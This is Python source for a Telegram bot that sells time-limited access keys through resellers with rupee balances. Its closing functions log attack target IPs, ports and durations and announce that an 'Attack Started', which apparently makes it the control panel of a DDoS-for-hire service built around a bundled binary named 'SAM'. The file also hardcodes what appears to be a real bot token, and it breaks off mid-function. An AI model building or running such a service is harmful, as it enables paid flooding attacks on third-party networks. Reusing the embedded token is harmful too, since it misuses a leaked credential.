#!/usr/bin/python3

import requests
import subprocess
import telebot
import datetime
import os
import time
import secrets
from datetime import timedelta
from threading import Timer
import pytz
import stat
os.chmod("SAM", stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

API_KEY = "YOUR_EXTERNAL_API_KEY"
ADMIN_IDS  = {"7212246299"}

USER_FILE        = "users.txt"
LOG_FILE         = "log.txt"
USER_ACCESS_FILE = "users_access.txt"
KEYS_FILE        = "keys.txt"
RESELLERS_FILE   = "resellers.txt"
BALANCE_FILE     = "balances.txt"

ist = pytz.timezone('Asia/Kolkata')

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  KEY PLANS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
KEY_PLANS = {
    "12hr":  {"duration": timedelta(hours=12), "cost": 30},
    "1day":  {"duration": timedelta(days=1),   "cost": 60},
    "3day":  {"duration": timedelta(days=3),   "cost": 180},
    "7day":  {"duration": timedelta(days=7),   "cost": 300},
    "30day": {"duration": timedelta(days=30),  "cost": 1000},
    "60day": {"duration": timedelta(days=60),  "cost": 1900},
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FILE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def read_users() -> list:
    try:
        with open(USER_FILE, "r") as f:
            return [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        return []

def save_users(users: list):
    with open(USER_FILE, "w") as f:
        for uid in users:
            f.write(f"{uid}\n")

def read_user_access() -> dict:
    data = {}
    try:
        with open(USER_ACCESS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid, expiry = line.split(":", 1)
                    data[uid] = {"expiry_time": float(expiry)}
    except FileNotFoundError:
        pass
    return data

def save_user_access(data: dict):
    with open(USER_ACCESS_FILE, "w") as f:
        for uid, info in data.items():
            f.write(f"{uid}:{info['expiry_time']}\n")

def read_keys() -> dict:
    keys = {}
    try:
        with open(KEYS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if "|" in line:
                    parts = line.split("|", 1)
                    keys[parts[0].strip()] = parts[1].strip()
    except FileNotFoundError:
        pass
    return keys

def save_keys(keys: dict):
    with open(KEYS_FILE, "w") as f:
        for key, plan in keys.items():
            f.write(f"{key}|{plan}\n")

def read_resellers() -> set:
    try:
        with open(RESELLERS_FILE, "r") as f:
            return {l.strip() for l in f if l.strip()}
    except FileNotFoundError:
        return set()

def save_resellers(resellers: set):
    with open(RESELLERS_FILE, "w") as f:
        for uid in resellers:
            f.write(f"{uid}\n")

def read_balances() -> dict:
    balances = {}
    try:
        with open(BALANCE_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid, bal = line.split(":", 1)
                    try:
                        balances[uid.strip()] = int(bal.strip())
                    except ValueError:
                        balances[uid.strip()] = 0
    except FileNotFoundError:
        pass
    return balances

def save_balances(balances: dict):
    with open(BALANCE_FILE, "w") as f:
        for uid, bal in balances.items():
            f.write(f"{uid}:{bal}\n")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  STATE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
allowed_user_ids: list = read_users()
user_access: dict      = read_user_access()
active_keys: dict      = read_keys()
RESELLER_IDS: set      = read_resellers()
balances: dict         = read_balances()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BOT INIT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot = telebot.TeleBot("7483857382:AAFPyTvOQMzm3XFTYpxHg32VrKHKUqfZ0Is") # Replace with your token

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def fmt_expiry(ts: float) -> str:
    return datetime.datetime.fromtimestamp(ts, tz=ist).strftime('%d %b %Y • %I:%M %p IST')

def generate_key() -> str:
    return "KEY-" + secrets.token_hex(10).upper()

def is_admin(uid: str) -> bool:
    return uid in ADMIN_IDS

def is_reseller(uid: str) -> bool:
    return uid in RESELLER_IDS

def is_admin_or_reseller(uid: str) -> bool:
    return is_admin(uid) or is_reseller(uid)

def get_balance(uid: str) -> int:
    return balances.get(uid, 0)

def log_action(user_id: str, action: str):
    try:
        info     = bot.get_chat(user_id)
        username = f"@{info.username}" if info.username else f"ID:{user_id}"
    except Exception:
        username = f"ID:{user_id}"
    now = datetime.datetime.now(ist).strftime("%d-%m-%Y %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{now}] {username} | {action}\n")

def clear_logs() -> str:
    if not os.path.exists(LOG_FILE) or os.stat(LOG_FILE).st_size == 0:
        return "No logs to clear."
    open(LOG_FILE, "w").close()
    return "✅  Logs cleared."

def no_access_msg() -> str:
    return (
        "╔══════════════════════╗\n"
        "║   🚫  ACCESS DENIED   ║\n"
        "╚══════════════════════╝\n\n"
        "You don't have an active plan.\n"
        "Use /redeem <key> to activate access."
    )

def admin_only_msg() -> str:
    return "⛔  This command is restricted to admins only."

def admin_reseller_only_msg() -> str:
    return "⛔  This command is restricted to admins and resellers only."

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  EXPIRY MANAGEMENT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def remove_expired_users():
    current_time = time.time()
    expired = [uid for uid, info in user_access.items()
               if info["expiry_time"] <= current_time]

    for uid in expired:
        try:
            bot.send_message(uid,
                "╔══════════════════════╗\n"
                "║   ⏰  PLAN EXPIRED    ║\n"
                "╚══════════════════════╝\n\n"
                "Your access plan has ended.\n\n"
                "🔑  Use /redeem <key> with a new key\n"
                "    to reactivate your access."
            )
        except Exception:
            pass
        user_access.pop(uid, None)
        if uid in allowed_user_ids:
            allowed_user_ids.remove(uid)

    if expired:
        save_users(allowed_user_ids)
        save_user_access(user_access)

    Timer(60, remove_expired_users).start()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  HANDLERS — General
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['start'])
def welcome_start(message):
    name = message.from_user.first_name
    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   Welcome, {name} 👋\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🤖  Bot is online and ready.\n\n"
        f"  /help    → View all commands\n"
        f"  /redeem  → Activate a key\n"
        f"  /id      → Your account info\n"
        f"  /plan    → Check expiry\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['help'])
def show_help(message):
    bot.reply_to(message,
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "      📋  COMMANDS\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "  👤 USER COMMANDS\n"
        "  /start    → Welcome screen\n"
        "  /id       → Account info\n"
        "  /plan     → Plan expiry\n"
        "  /redeem   → Activate a key\n"
        "  /mylogs   → Your activity\n"
        "  /rules    → Usage rules\n"
        "  /status   → Bot status\n\n"
        "  🤝 RESELLER & ADMIN\n"
        "  /prices   → Key price list\n"
        "  /genkey   → Generate key\n"
        "  /listkeys → List unused keys\n"
        "  /deletekey→ Delete a key\n"
        "  /balance  → Check balance\n\n"
        "  🛠 ADMIN ONLY\n"
        "  /admincmd → View admin panel\n"
        "  /add      → Add user directly\n"
        "  /remove   → Remove a user\n"
        "  /allusers → List all users\n"
        "  /addreseller → Add a reseller\n"
        "  /rmreseller  → Remove reseller\n"
        "  /resellers   → List resellers\n"
        "  /addbalance  → Add funds\n"
        "  /setbalance  → Set funds\n"
        "  /broadcast   → Send msg to all\n"
        "  /logs        → Get log file\n"
        "  /clearlogs   → Clear log file\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['status'])
def bot_status(message):
    now = datetime.datetime.now(ist).strftime('%d %b %Y • %I:%M %p')
    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"      🟢  BOT STATUS\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  Status   →  Online ✅\n"
        f"  Uptime   →  24 × 7\n"
        f"  Time     →  {now}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['rules'])
def show_rules(message):
    bot.reply_to(message,
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "       📜  RULES\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "  1.  Do not share your key.\n"
        "  2.  One key = one account.\n"
        "  3.  Keys are non-refundable.\n"
        "  4.  Use /plan to check expiry.\n"
        "  5.  Violations may result in ban.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['prices'])
def show_prices(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id):
        bot.reply_to(message, admin_reseller_only_msg())
        return

    lines = [
        "━━━━━━━━━━━━━━━━━━━━━━",
        "    💰  KEY PRICE LIST",
        "━━━━━━━━━━━━━━━━━━━━━━",
        "",
        "  Plan      Duration    Price",
        "  ──────────────────────────",
    ]
    plan_display = {
        "12hr":  "12 Hours ",
        "1day":  "1 Day    ",
        "3day":  "3 Days   ",
        "7day":  "7 Days   ",
        "30day": "30 Days  ",
        "60day": "60 Days  ",
    }
    for plan, info in KEY_PLANS.items():
        label = plan_display.get(plan, plan.ljust(9))
        cost  = info["cost"]
        lines.append(f"  {plan.ljust(8)}  {label}  ₹{cost}")
    lines += [
        "",
        "  Use /genkey <plan> to generate",
        "",
        "━━━━━━━━━━━━━━━━━━━━━━"
    ]
    bot.reply_to(message, "\n".join(lines))

@bot.message_handler(commands=['id'])
def show_user_info(message):
    user_id  = str(message.chat.id)
    username = f"@{message.from_user.username}" if message.from_user.username else "—"
    role     = "Admin" if is_admin(user_id) else ("Reseller" if is_reseller(user_id) else "User")

    if user_id in user_access:
        expiry_line = f"  Expiry  →  {fmt_expiry(user_access[user_id]['expiry_time'])}"
    else:
        expiry_line = "  Expiry  →  No active plan"

    bal_line = ""
    if is_reseller(user_id):
        bal_line = f"\n  Balance →  ₹{get_balance(user_id)}"

    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"    👤  ACCOUNT INFO\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  ID       →  {user_id}\n"
        f"  Username →  {username}\n"
        f"  Role     →  {role}\n"
        f"{expiry_line}"
        f"{bal_line}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['plan'])
def show_plan(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, no_access_msg())
        return
    if user_id in user_access:
        expiry = fmt_expiry(user_access[user_id]['expiry_time'])
        bot.reply_to(message,
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"      📅  YOUR PLAN\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"  Status   →  Active ✅\n"
            f"  Expires  →  {expiry}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
    else:
        bot.reply_to(message, "⚠️  No expiry info found.")

@bot.message_handler(commands=['mylogs'])
def show_my_logs(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, no_access_msg())
        return
    try:
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
        user_logs = [l for l in lines if user_id in l]
        if user_logs:
            bot.reply_to(message,
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "    📋  YOUR ACTIVITY\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n\n" +
                "".join(user_logs[-20:]) +
                "\n━━━━━━━━━━━━━━━━━━━━━━"
            )
        else:
            bot.reply_to(message, "No activity found for your account.")
    except FileNotFoundError:
        bot.reply_to(message, "No logs found.")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  KEY SYSTEM
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.chat.id)
    parts   = message.text.split()

    if len(parts) < 2:
        bot.reply_to(message,
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "    🔑  REDEEM KEY\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "  Usage: /redeem <key>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        )
        return

    key = parts[1].strip().upper()

    if key not in active_keys:
        bot.reply_to(message,
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "    ❌  INVALID KEY\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "  This key is invalid or\n"
            "  has already been used.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        )
        return

    plan_label = active_keys[key]
    plan_info  = KEY_PLANS.get(plan_label)
    if not plan_info:
        bot.reply_to(message, "❌  Unknown plan on this key. Contact admin.")
        return

    now       = datetime.datetime.now(ist)
    expiry_ts = (now + plan_info["duration"]).timestamp()

    if user_id not in allowed_user_ids:
        allowed_user_ids.append(user_id)
        with open(USER_FILE, "a") as f:
            f.write(f"{user_id}\n")

    user_access[user_id] = {"expiry_time": expiry_ts}
    save_user_access(user_access)

    del active_keys[key]
    save_keys(active_keys)

    log_action(user_id, f"Redeemed key | plan={plan_label}")

    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   ✅  KEY ACTIVATED\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  Plan     →  {plan_label}\n"
        f"  Expires  →  {fmt_expiry(expiry_ts)}\n\n"
        f"  Use /help to explore commands.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['genkey'])
def gen_key(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id):
        bot.reply_to(message, admin_reseller_only_msg())
        return

    parts = message.text.split()
    if len(parts) < 2 or parts[1] not in KEY_PLANS:
        bot.reply_to(message,
            f"Usage: /genkey <plan>\n"
            f"Plans: {', '.join(KEY_PLANS.keys())}"
        )
        return

    plan      = parts[1]
    plan_info = KEY_PLANS[plan]
    cost      = plan_info["cost"]

    # Resellers must have enough balance
    if is_reseller(user_id) and not is_admin(user_id):
        current_bal = get_balance(user_id)
        if current_bal < cost:
            bot.reply_to(message,
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   ❌  INSUFFICIENT BALANCE\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"  Plan      →  {plan}\n"
                f"  Cost      →  ₹{cost}\n"
                f"  Balance   →  ₹{current_bal}\n"
                f"  Needed    →  ₹{cost - current_bal} more\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            )
            return
        # Deduct balance
        balances[user_id] = current_bal - cost
        save_balances(balances)

    key = generate_key()
    active_keys[key] = plan
    save_keys(active_keys)
    log_action(user_id, f"Generated key | plan={plan} | cost=₹{cost}")

    bal_line = ""
    if is_reseller(user_id) and not is_admin(user_id):
        bal_line = f"  Balance  →  ₹{get_balance(user_id)} remaining\n"

    # HTML Parsing used to make the key Tap-to-Copy
    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"    🔑  KEY GENERATED\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  Key      →  <code>{key}</code>\n"
        f"  Plan     →  {plan}\n"
        f"  Cost     →  ₹{cost}\n"
        f"{bal_line}\n"
        f"  Share this key with the user.\n"
        f"  They can tap the key to copy it and activate with /redeem\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id):
        bot.reply_to(message, admin_reseller_only_msg())
        return
    if not active_keys:
        bot.reply_to(message, "No unused keys available.")
        return
    lines = [
        "━━━━━━━━━━━━━━━━━━━━━━",
        "    🔑  UNUSED KEYS",
        "━━━━━━━━━━━━━━━━━━━━━━",
        ""
    ]
    for k, plan in active_keys.items():
        lines.append(f"  {k}  [{plan}]")
    lines += ["", "━━━━━━━━━━━━━━━━━━━━━━"]
    bot.reply_to(message, "\n".join(lines))

@bot.message_handler(commands=['deletekey'])
def delete_key(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id):
        bot.reply_to(message, admin_reseller_only_msg())
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /deletekey <key>")
        return
    key = parts[1].strip().upper()
    if key in active_keys:
        del active_keys[key]
        save_keys(active_keys)
        bot.reply_to(message, f"✅  Key deleted.")
    else:
        bot.reply_to(message, "❌  Key not found.")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BALANCE SYSTEM
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, admin_only_msg())
        return

    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /addbalance <userId> <amount>")
        return

    target = parts[1]
    try:
        amount = int(parts[2])
        if amount <= 0:
            raise ValueError
    except ValueError:
        bot.reply_to(message, "❌  Amount must be a positive number.")
        return

    if target not in RESELLER_IDS:
        bot.reply_to(message, "❌  This user is not a reseller.")
        return

    balances[target] = get_balance(target) + amount
    save_balances(balances)
    log_action(user_id, f"Added ₹{amount} balance to reseller={target}")

    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   💰  BALANCE ADDED\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  Reseller  →  {target}\n"
        f"  Added     →  ₹{amount}\n"
        f"  Total     →  ₹{get_balance(target)}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['setbalance'])
def set_balance(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, admin_only_msg())
        return

    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /setbalance <userId> <amount>")
        return

    target = parts[1]
    try:
        amount = int(parts[2])
        if amount < 0:
            raise ValueError
    except ValueError:
        bot.reply_to(message, "❌  Amount must be 0 or more.")
        return

    if target not in RESELLER_IDS:
        bot.reply_to(message, "❌  This user is not a reseller.")
        return

    balances[target] = amount
    save_balances(balances)
    log_action(user_id, f"Set balance of reseller={target} to ₹{amount}")

    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   💰  BALANCE SET\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  Reseller  →  {target}\n"
        f"  Balance   →  ₹{amount}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)

    # Admin can check anyone's balance: /balance <userId>
    parts = message.text.split()
    if is_admin(user_id) and len(parts) > 1:
        target = parts[1]
        bot.reply_to(message,
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   💰  RESELLER BALANCE\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"  User     →  {target}\n"
            f"  Balance  →  ₹{get_balance(target)}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
        return

    if not is_reseller(user_id):
        bot.reply_to(message, admin_reseller_only_msg())
        return

    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   💰  YOUR BALANCE\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  Balance  →  ₹{get_balance(user_id)}\n\n"
        f"  Use /prices to view key costs.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ADMIN — User Management
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, admin_only_msg())
        return
    bot.reply_to(message,
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "    🛠  ADMIN COMMANDS\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "  👤  USER MANAGEMENT\n"
        "  /add <id> <plan>      Add user\n"
        "  /remove <id>          Remove user\n"
        "  /allusers             List users\n\n"
        "  🤝  RESELLER\n"
        "  /addreseller <id>     Add reseller\n"
        "  /rmreseller <id>      Remove reseller\n"
        "  /resellers            List resellers\n"
        "  /addbalance <id> <₹>  Add balance\n"
        "  /setbalance <id> <₹>  Set balance\n"
        "  /balance <id>         Check balance\n\n"
        "  🔑  KEYS\n"
        "  /genkey <plan>        Generate key\n"
        "  /listkeys             List keys\n"
        "  /deletekey <key>      Delete key\n\n"
        "  📢  OTHER\n"
        "  /broadcast <msg>      Broadcast\n"
        "  /logs                 Download logs\n"
        "  /clearlogs            Clear logs\n\n"
        f"  Plans: {', '.join(KEY_PLANS.keys())}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, admin_only_msg())
        return
    parts = message.text.split()
    if len(parts) < 3 or parts[2] not in KEY_PLANS:
        bot.reply_to(message,
            f"Usage: /add <userId> <plan>\n"
            f"Plans: {', '.join(KEY_PLANS.keys())}")
        return

    target    = parts[1]
    plan      = parts[2]
    expiry_ts = (datetime.datetime.now(ist) + KEY_PLANS[plan]["duration"]).timestamp()

    if target not in allowed_user_ids:
        allowed_user_ids.append(target)
        with open(USER_FILE, "a") as f:
            f.write(f"{target}\n")
        prefix = "✅  User added."
    else:
        prefix = "🔄  Access updated."

    user_access[target] = {"expiry_time": expiry_ts}
    save_user_access(user_access)
    log_action(user_id, f"Added user={target} plan={plan}")

    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   {prefix}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  User     →  {target}\n"
        f"  Plan     →  {plan}\n"
        f"  Expires  →  {fmt_expiry(expiry_ts)}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, admin_only_msg())
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /remove <userId>")
        return
    target = parts[1]
    if target in allowed_user_ids:
        allowed_user_ids.remove(target)
        user_access.pop(target, None)
        save_users(allowed_user_ids)
        save_user_access(user_access)
        log_action(user_id, f"Removed user={target}")
        bot.reply_to(message, f"✅  User {target} removed.")
    else:
        bot.reply_to(message, "❌  User not found.")

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, admin_only_msg())
        return
    if not allowed_user_ids:
        bot.reply_to(message, "No authorized users found.")
        return
    lines = [
        "━━━━━━━━━━━━━━━━━━━━━━",
        "    👥  AUTHORIZED USERS",
        "━━━━━━━━━━━━━━━━━━━━━━",
        ""
    ]
    for uid in allowed_user_ids:
        expiry_info = f"  [{fmt_expiry(user_access[uid]['expiry_time'])}]" if uid in user_access else "  [No expiry]"
        try:
            info  = bot.get_chat(int(uid))
            uname = f"@{info.username}" if info.username else f"ID:{uid}"
        except Exception:
            uname = f"ID:{uid}"
        lines.append(f"  {uname}{expiry_info}")
    lines += ["", "━━━━━━━━━━━━━━━━━━━━━━"]
    bot.reply_to(message, "\n".join(lines))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ADMIN — Reseller Management
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, admin_only_msg())
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /addreseller <userId>")
        return
    target = parts[1]
    RESELLER_IDS.add(target)
    save_resellers(RESELLER_IDS)
    if target not in balances:
        balances[target] = 0
        save_balances(balances)
    log_action(user_id, f"Added reseller={target}")
    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   ✅  RESELLER ADDED\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  User     →  {target}\n"
        f"  Balance  →  ₹0\n\n"
        f"  Use /addbalance to fund them.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['rmreseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, admin_only_msg())
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /rmreseller <userId>")
        return
    target = parts[1]
    if target in RESELLER_IDS:
        RESELLER_IDS.discard(target)
        save_resellers(RESELLER_IDS)
        log_action(user_id, f"Removed reseller={target}")
        bot.reply_to(message, f"✅  Reseller {target} removed.")
    else:
        bot.reply_to(message, "❌  Reseller not found.")

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, admin_only_msg())
        return
    if not RESELLER_IDS:
        bot.reply_to(message, "No resellers found.")
        return
    lines = [
        "━━━━━━━━━━━━━━━━━━━━━━",
        "     🤝  RESELLERS",
        "━━━━━━━━━━━━━━━━━━━━━━",
        ""
    ]
    for uid in RESELLER_IDS:
        try:
            info  = bot.get_chat(int(uid))
            uname = f"@{info.username}" if info.username else f"ID:{uid}"
        except Exception:
            uname = f"ID:{uid}"
        bal = get_balance(uid)
        lines.append(f"  {uname}  →  ₹{bal}")
    lines += ["", "━━━━━━━━━━━━━━━━━━━━━━"]
    bot.reply_to(message, "\n".join(lines))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ADMIN — Logs & Broadcast
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['logs'])
def send_logs(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, admin_only_msg())
        return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        with open(LOG_FILE, "rb") as f:
            bot.send_document(message.chat.id, f)
    else:
        bot.reply_to(message, "No logs found.")

@bot.message_handler(commands=['clearlogs'])
def clear_logs_cmd(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, admin_only_msg())
        return
    bot.reply_to(message, clear_logs())

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id):
        bot.reply_to(message, admin_only_msg())
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>")
        return

    text = (
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "      📢  BROADCAST\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{parts[1]}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

    # Send to all known users (allowed + resellers), skip duplicates
    all_targets = list(set(allowed_user_ids) | RESELLER_IDS)
    success, fail = 0, 0
    for uid in all_targets:
        try:
            bot.send_message(uid, text)
            success += 1
        except Exception as e:
            print(f"Broadcast failed for {uid}: {e}")
            fail += 1

    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   📢  BROADCAST DONE\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  ✅  Sent     →  {success}\n"
        f"  ❌  Failed   →  {fail}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 🚀 Attack  Started Succesfully! 🚀\n\nTarget IP: {target}\nPort: {port}\nDuration: {time} seconds"
